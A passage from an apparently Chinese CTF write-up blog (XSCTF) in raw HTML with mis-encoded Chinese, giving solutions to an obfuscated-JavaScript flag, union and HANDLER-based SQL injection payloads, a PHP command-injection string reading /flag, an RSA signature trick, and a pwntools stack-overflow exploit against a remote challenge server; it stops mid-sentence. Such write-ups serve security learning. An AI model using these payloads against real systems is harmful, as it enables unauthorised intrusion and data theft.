class="string">&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;</span>,<span class="string">&#x27;3076824IERKkW&#x27;</span>,<span class="string">&#x27;6626otVnDv&#x27;</span>,<span class="string">&#x27;4488330eyQBas&#x27;</span>,<span class="string">&#x27;7196435AHLNnm&#x27;</span>];_0x1173=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0x2badaa;&#125;;<span class="keyword">return</span> _0x1173();&#125;(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3fa77a,_0x506be4</span>)</span>&#123;<span class="keyword">var</span> _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();<span class="function"><span class="title">while</span>(<span class="params">!![]</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x5cf5b7=-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x107</span>))/<span class="number">0x1</span>*(-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10f</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10e</span>))/<span class="number">0x3</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x109</span>))/<span class="number">0x4</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x105</span>))/<span class="number">0x5</span>+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x110</span>))/<span class="number">0x6</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10b</span>))/<span class="number">0x7</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10a</span>))/<span class="number">0x8</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x108</span>))/<span class="number">0x9</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x106</span>))/<span class="number">0xa</span>);<span class="keyword">if</span>(_0x5cf5b7===_0x506be4)<span class="keyword">break</span>;<span class="keyword">else</span> _0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x29c073</span>)</span>&#123;_0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x1173,<span class="number">0xf2d11</span>),<span class="built_in">console</span>[_0x21b6c9(<span class="number">0x10c</span>)](atob(_0x21b6c9(<span class="number">0x10d</span>))));</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¤åˆ¶åˆ°æµè§ˆå™¨æ§åˆ¶å°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__   __   _____    _____   _______   ______     __                              _____           _   _     _           _            ______                  __                  _  _     _     _    ___                              __             ____    _        __                                _     _                  __   </span><br><span class="line">\ \ &#x2F; &#x2F;  &#x2F; ____|  &#x2F; ____| |__   __| |  ____|   &#x2F; &#x2F;     &#x2F;\                      |_   _|         (_) | |   (_)         | |          |  ____|                &#x2F;_ |                | || |   | |   (_)  &#x2F; _ \                            &#x2F; _|           &#x2F; __ \  | |      &#x2F; _|                              | |   (_)                 \ \  </span><br><span class="line"> \ V &#x2F;  | (___   | |         | |    | |__     | |     &#x2F;  \     _ __              | |    _ __    _  | |_   _    __ _  | |          | |__    __  __  _ __    | |   ___    _ __  | || |_  | |_   _  | | | |  _ __              ___   | |_           | |  | | | |__   | |_   _   _   ___    ___    __ _  | |_   _    ___    _ __    | | </span><br><span class="line">  &gt; &lt;    \___ \  | |         | |    |  __|   &#x2F; &#x2F;     &#x2F; &#x2F;\ \   | &#39;_ \             | |   | &#39;_ \  | | | __| | |  &#x2F; _&#96; | | |          |  __|   \ \&#x2F; &#x2F; | &#39;_ \   | |  &#x2F; _ \  | &#39;__| |__   _| | __| | | | | | | | &#39;_ \            &#x2F; _ \  |  _|          | |  | | | &#39;_ \  |  _| | | | | &#x2F; __|  &#x2F; __|  &#x2F; _&#96; | | __| | |  &#x2F; _ \  | &#39;_ \    \ \</span><br><span class="line"> &#x2F; . \   ____) | | |____     | |    | |      \ \    &#x2F; ____ \  | | | |           _| |_  | | | | | | | |_  | | | (_| | | |          | |____   &gt;  &lt;  | |_) |  | | | (_) | | |       | |   | |_  | | | |_| | | | | |          | (_) | | |            | |__| | | |_) | | |   | |_| | \__ \ | (__  | (_| | | |_  | | | (_) | | | | |   &#x2F; &#x2F;</span><br><span class="line">&#x2F;_&#x2F; \_\ |_____&#x2F;   \_____|    |_|    |_|       | |  &#x2F;_&#x2F;    \_\ |_| |_|          |_____| |_| |_| |_|  \__| |_|  \__,_| |_|          |______| &#x2F;_&#x2F;\_\ | .__&#x2F;   |_|  \___&#x2F;  |_|       |_|    \__| |_|  \___&#x2F;  |_| |_|           \___&#x2F;  |_|             \____&#x2F;  |_.__&#x2F;  |_|    \__,_| |___&#x2F;  \___|  \__,_|  \__| |_|  \___&#x2F;  |_| |_|  | | </span><br><span class="line">                                               \_\                     ______                                             ______                  | |                                                             ______                 ______                                                                                &#x2F;_&#x2F;  </span><br><span class="line">                                                                      |______|                                           |______|                 |_|                                                            |______|               |______|                                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹‰ä¼¸ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°flagï¼ˆæ¢æˆä¸ä¼šè‡ªåŠ¨æ¢è¡Œçš„æ–‡æœ¬ç¼–è¾‘è½¯ä»¶ï¼Œå¦‚notepad++ï¼‰</p><p><code>XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125;</code></p><h2 id="saveSaofe1a-partA"><a href="#saveSaofe1a-partA" class="headerlink" title="saveSaofe1a_partA"></a>saveSaofe1a_partA</h2><p>è€ƒsqlæ³¨å…¥<br>æµ‹è¯•ä¸€ä¸‹å‘ç°æ˜¯å­—ç¬¦å‹æŸ¥è¯¢ï¼Œå¹¶ä¸”å­˜åœ¨è”åˆæ³¨å…¥</p><ul><li>é¦–å…ˆæŸ¥è¯¢å½“å‰æ•°æ®åº“</li><li>ç„¶åæŸ¥è¯¢è¯¥æ•°æ®åº“ä¸‹çš„è¡¨</li><li>ç„¶åæŸ¥è¯¢è¡¨ä¸‹çš„å­—æ®µ</li><li>æ ¹æ®é¢˜ç›®æç¤ºï¼Œé€ä¸ªç¿»è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;</span>student<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;class1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>),<span class="keyword">group_concat</span>(<span class="keyword">name</span>),<span class="keyword">group_concat</span>(<span class="keyword">class</span>),<span class="keyword">group_concat</span>(hobbies) <span class="keyword">from</span> class2<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125;</code></p><h2 id="saveSaofe1a-partB"><a href="#saveSaofe1a-partB" class="headerlink" title="saveSaofe1a_partB"></a>saveSaofe1a_partB</h2><p>åŒæ ·æ˜¯sqlæ³¨å…¥<br>ç»è¿‡æµ‹è¯•ï¼š<br><code>è®©æˆ‘æƒ³æƒ³é™¤äº†insertã€whereã€deleteã€selectã€dropã€updateå’Œ.ä½ ä»¬å¤§é»‘é˜”è¿˜æœ‰ä»€ä¹ˆæ‹›</code><br><code>å˜»å˜»ï¼Œæƒ³èµ·æ¥äº†ï¼Œsetã€prepareã€executeä¹Ÿä¸è¡Œå“¦</code></p><p>ç”¨handlerå¯ä»¥æŸ¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸åœ¨ç¬¬ä¸€æ¡ï¼Œä½†æ˜¯é¢˜ç›®åˆè¿‡æ»¤äº†whereå…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">read</span> <span class="keyword">first</span> <span class="keyword">limit</span> <span class="number">30</span>,<span class="number">1</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125;</code></p><h2 id="ç‡•å­ä¸è¦èµ°"><a href="#ç‡•å­ä¸è¦èµ°" class="headerlink" title="ç‡•å­ä¸è¦èµ°~"></a>ç‡•å­ä¸è¦èµ°~</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‡•å­ï¼Œç‡•å­ï¼Œæ²¡æœ‰ä½ æˆ‘æ€ä¹ˆæ´»å•Šï¼Œä¸è¦ç”©å¼€æˆ‘å•Š  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params">$cmd</span>)</span>&#123;    system($cmd.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) ? hello_shell($_GET[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨åˆ†å·éš”å¼€å³å¯<br><code>?cmd=cat /flag;</code></p><p><code>XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125;</code></p><h2 id="gift-RSA"><a href="#gift-RSA" class="headerlink" title="gift_RSA"></a>gift_RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">gift = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">print(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">print(<span class="string">f&#x27;gift = <span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"><span class="string">gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®å…¬é’¥åŠ å¯†ç®—æ³•çš„ç‰¹æ€§ï¼Œå…¬ç§é’¥äº’æ¢æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œç”¨ç§é’¥åŠ å¯†ï¼ˆç­¾åï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬é’¥è§£å¯†ï¼ˆéªŒè¯ï¼‰</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line">n = <span class="number">130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, e, n)))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125;</code></p><h2 id="ä½ è¯´ä½ æ˜¯å‡¯æ’’å¤§å¸å°Šå˜Ÿå‡å˜Ÿå•Š"><a href="#ä½ è¯´ä½ æ˜¯å‡¯æ’’å¤§å¸å°Šå˜Ÿå‡å˜Ÿå•Š" class="headerlink" title="ä½ è¯´ä½ æ˜¯å‡¯æ’’å¤§å¸å°Šå˜Ÿå‡å˜Ÿå•Š"></a>ä½ è¯´ä½ æ˜¯å‡¯æ’’å¤§å¸å°Šå˜Ÿå‡å˜Ÿå•Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ã–v0 0vo O.0 O_Ã– Ã–vo 0vo ov0 ovÃ– o.Ã– owÃ– 0.o OwÃ– o.O Ã–.O O_0 o_Ã– Ã–_0 OwÃ– Ov0 0wÃ– Ã–.Ã– owO 0v0 o.O o.Ã– Ã–.0 o.0 ovO o.Ã– Ã–.o 0vo Ow0 Ã–.Ã– owo 0_0 0.0 o.Ã– Ã–.O O.0 O_0 o_O 0vÃ– owo </span><br></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">å°Šå˜Ÿå‡å˜ŸO.o (zdjd.vercel.app)</a></p><p>è§£å¯†ä¹‹åå‡¯æ’’çˆ†ç ´</p><p><code>XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_warmup</title>
      <link href="2024/11/04/xsctf_warmup/"/>
      <url>2024/11/04/xsctf_warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>é™„ä»¶ï¼šbabystack</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  init_func(argc, argv, envp);</span><br><span class="line">  start_show();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  __isoc99_scanf(v4);</span><br><span class="line">  vuln(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">vuln</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x7FFFFFFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402038);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_40205D);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x8848</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¯¹äºç¬¬ä¸€ä¸ªæ¯”è¾ƒï¼Œç›´æ¥è¾“å…¥-1</li><li>å¯¹äºreadå‡½æ•°ï¼Œè¾“å…¥80+8ä¸ªå­—ç¬¦ä¹‹åå†è¾“å…¥éœ€è¦è¿”å›çš„åœ°å€ï¼ˆbackdoorï¼‰å³å¯</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">print(<span class="string">&#x27;0x%x&#x27;</span>%sysaddr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(sysaddr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æ¥è¯´è¿™ä¹ˆå†™æ²¡é—®é¢˜ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™ä¸ä¼šè¿”å›shell<br>åŸå› ä¼°è®¡æ˜¯å †æ ˆå¹³è¡¡ä¹‹ç±»çš„é—®é¢˜ï¼Œè§£å†³çš„æ–¹æ³•æ˜¯ç›´æ¥è¿”å›åˆ°è°ƒç”¨systemå‡½æ•°çš„åœ°å€ï¼Œè·³è¿‡æ ˆæ“ä½œ<br><img src="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" srcset="data:image/png;base64,666" alt="image"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x4012bf</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>å‘</strong></p><ul><li>å½“è¿”å›åˆ°åé—¨å‡½æ•°è¡Œä¸é€šçš„æ—¶å€™ï¼Œè¿”å›åˆ°è°ƒç”¨systemå‡½æ•°çš„è¯­å¥</li><li>Windowså’ŒLinuxå¹³å°è¿è¡ŒåŒä¸€ä»½expçš„ç»“æœå¯èƒ½ä¸åŒ</li></ul><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h2 id="Badbad-filename"><a href="#Badbad-filename" class="headerlink" title="Badbad_filename"></a>Badbad_filename</h2><p><code>GET me a filename and I&#39;ll include 